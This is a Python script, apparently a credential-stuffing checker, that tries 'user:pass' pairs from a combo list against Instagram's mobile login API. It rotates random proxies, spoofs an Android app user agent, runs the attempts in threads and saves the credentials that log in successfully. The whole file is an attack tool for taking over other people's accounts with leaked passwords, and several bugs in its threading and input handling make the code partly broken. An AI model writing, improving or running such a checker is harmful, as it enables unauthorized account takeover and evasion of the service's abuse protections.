from weakref import proxy
from requests import post
import threading
import uuid
import random
class instagram():
    User_Agent = 'Instagram 113.1.0.26.5 (Android 6)'
    URL_LOGIN = "https://i.instagram.com/api/v1/accounts/login/"
    NUM_TH = 10
    lisst = open("cc.txt").read().splitlines()
    li_num = 0
    Stop = False
    list_good = []
    def login(self,UserPassword):
        #0    #1
        #user:pass
        a =UserPassword.split(':')
        user = a[0]
        Pass = a[1]


        data = {
        'username':user,
        'password':Pass,
        'device_id':str(uuid.uuid4()),
        }
        print(open("proxy.txt").read().splitlines())
        proxy = {
            'http':'http://' + random.choice(open("proxy.txt").read().splitlines()),
            'https':'https://' + random.choice(open("proxy.txt").read().splitlines()),
        }
        req = post(self.URL_LOGIN, data=data,headers={"User-Agent": self.User_Agent},proxies=proxy)
        # else:
        #     print("run without proxy")
        #     req = post(self.URL_LOGIN, data=data,headers={"User-Agent": self.User_Agent})
        if req.status_code == 200:
            self.list_good.append(UserPassword)
            print(UserPassword)
        print(req.text)
        if self.li_num>= len(self.lisst):
            self.Stop = True
            self.li_num= 0
        self.li_num +=1

    def loops(self):
        while not self.Stop:
            for _ in range(0,self.th):
                th = threading.Thread(target=self.login(self.lisst[self.li_num]))
                th.start()

ss = instagram()
ss.th = input("Enter U th")
ss.loops()